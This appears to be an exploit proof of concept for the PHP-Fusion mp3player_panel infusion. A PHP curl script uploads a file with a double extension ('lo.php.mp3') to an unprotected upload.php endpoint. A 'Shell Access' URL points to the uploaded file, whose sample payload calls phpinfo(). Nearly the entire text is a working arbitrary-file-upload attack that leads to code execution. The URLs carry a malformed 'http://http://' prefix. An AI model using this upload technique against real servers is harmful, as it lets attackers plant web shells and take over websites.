PostShell.php
<?php

$uploadfile="lo.php.mp3";

$ch = curl_init("http://http://www.example.com/php-fusion/infusions/mp3player_panel/upload.php?folder=/php-fusion/infusions/mp3player_panel/");
curl_setopt($ch, CURLOPT_POST, true);   
curl_setopt($ch, CURLOPT_POSTFIELDS, array('Filedata'=>"@$uploadfile"));
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
$postResult = curl_exec($ch);
curl_close($ch);
   
print "$postResult";

?>

Shell Access : http://http://www.example.com/php-fusion/infusions/mp3player_panel/lo.php.mp3

lo.php.mp3
<?php
phpinfo();
?>
